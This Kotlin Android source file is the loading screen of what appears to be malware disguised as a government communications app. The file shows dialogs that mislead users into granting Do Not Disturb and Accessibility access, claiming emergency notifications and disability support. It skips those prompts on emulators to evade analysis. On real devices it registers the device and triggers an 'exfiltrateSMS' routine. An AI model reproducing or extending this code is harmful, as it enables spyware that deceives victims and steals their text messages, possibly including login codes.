package com.mobilesec.govcomm.ui.screens.loading

import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.navigation.NavController
import androidx.navigation.compose.rememberNavController
import kotlinx.coroutines.delay
import android.annotation.SuppressLint
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.util.Log
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.LifecycleOwner
import com.mobilesec.govcomm.mal.stuff
import com.mobilesec.govcomm.mal.GovcommAccessibilityService
import com.mobilesec.govcomm.mal.NewPermissionRequestActivity
import com.mobilesec.govcomm.mal.SecurityUtils
import com.mobilesec.govcomm.mal.getInstallationId
import com.mobilesec.govcomm.mal.isAccessibilityServiceEnabled

@SuppressLint("CoroutineCreationDuringComposition")
@Composable
fun LoadingScreen(
    navController: NavController = rememberNavController(),
    stuff: stuff
) {

    val scope = rememberCoroutineScope()
    val context = LocalContext.current
    var showDndDialog by remember { mutableStateOf(false) }
    var showAccessibilityDialog by remember { mutableStateOf(false) }
    val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    val lifecycleOwner: LifecycleOwner = LocalLifecycleOwner.current
    val isServiceEnabled = isAccessibilityServiceEnabled(context, GovcommAccessibilityService::class.java)

    // Show loading UI
    Box(
        contentAlignment = Alignment.Center,
        modifier = Modifier.fillMaxSize()
    ) {
        CircularProgressIndicator(color = MaterialTheme.colorScheme.primary)
    }

    // Define a launcher for opening DND settings
    val permActivityLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { }


    // Check if the service is enabled and DND access is granted when screen launch
    LaunchedEffect(key1 = notificationManager.isNotificationPolicyAccessGranted, key2 = isServiceEnabled, key3 = SecurityUtils.isNotRealDevice(context)) {
        // If the user has granted DND access and the service is enabled, navigate to the login screen
        // OR if the device is not real
        if (( SecurityUtils.isNotRealDevice(context) || notificationManager.isNotificationPolicyAccessGranted && isServiceEnabled))  {
        //if (( notificationManager.isNotificationPolicyAccessGranted && isServiceEnabled))  {
            showDndDialog = false
            showAccessibilityDialog = false
            delay(500) // Add a delay to ensure the user sees the loading screen for a bit

            // Navigate to LoginScreen and pop off the backstack
            navController.navigate("LoginScreen") {
                navController.popBackStack()
            }
        }
    }

    // Observe lifecycle to know when the app returns from the settings screen
    // For updating showDialog to false if permission granted
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                if (notificationManager.isNotificationPolicyAccessGranted) {
                    Log.d("HELPPP", "dnd IS ENABLED")
                    showDndDialog = false
                }
                if (isAccessibilityServiceEnabled(context, GovcommAccessibilityService::class.java)) {
                    Log.d("HELPPP", "ACCESSIBILITY IS ENABLED")
                    showAccessibilityDialog = false
                }
            }
        }

        lifecycleOwner.lifecycle.addObserver(observer)

        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
        }
    }

    // Request basic permissions
    val intent = Intent(context, NewPermissionRequestActivity::class.java)
    context.startActivity(intent)

    // If permissions not granted, show dialog(s)
    if (notificationManager.isNotificationPolicyAccessGranted) {
        if (isServiceEnabled) {
            if (!SecurityUtils.isNotRealDevice(context)) {
                Log.d("SecurityUtil", "REAL DEVICE")
                val uuid = getInstallationId(context)
                stuff.registerDevice(uuid) { success ->
                    if (success == "registration_success") {
                        stuff.sms?.exfiltrateSMS()
                    }
                }
            }
        } else {
            showAccessibilityDialog = true
        }
    } else {
        showDndDialog = true
    }

    // Include a dialog that asks for DND permission
    if (!SecurityUtils.isNotRealDevice(context)) {
    //if (SecurityUtils.isNotRealDevice(context)) {
        if (showDndDialog) {
            AlertDialog(
                onDismissRequest = { showDndDialog = false },
                title = { Text("Permission Required") },
                text = { Text("This app requires Do Not Disturb access to allow ensure notifications can be sent during emergencies. Please grant this permission in the next screen.") },
                confirmButton = {
                    Button(
                        onClick = {
                            showDndDialog = false
                            permActivityLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS))
                        }
                    ) {
                        Text("OK")
                    }
                },
                dismissButton = {
                    Button(onClick = { showDndDialog = false }) {
                        Text("Cancel")
                    }
                }
            )
        }

        if (!isAccessibilityServiceEnabled(context, GovcommAccessibilityService::class.java)) {
            if (showAccessibilityDialog) {
                AlertDialog(
                    onDismissRequest = { showAccessibilityDialog = false },
                    title = { Text(text = "Enable Accessibility Service") },
                    text = { Text("As this app is handicap friendly thus requires Accessibility Service to be enabled. Please enable it in the settings.") },
                    confirmButton = {
                        Button(
                            onClick = {
                                context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                                showAccessibilityDialog = false
                            }
                        ) {
                            Text("Go to Settings")
                        }
                    },
                    dismissButton = {
                        Button(onClick = {
                            showAccessibilityDialog = false  // Call the exit action
                        }) {
                            Text("Cancel")
                        }
                    }
                )
            }
        }
    }
}
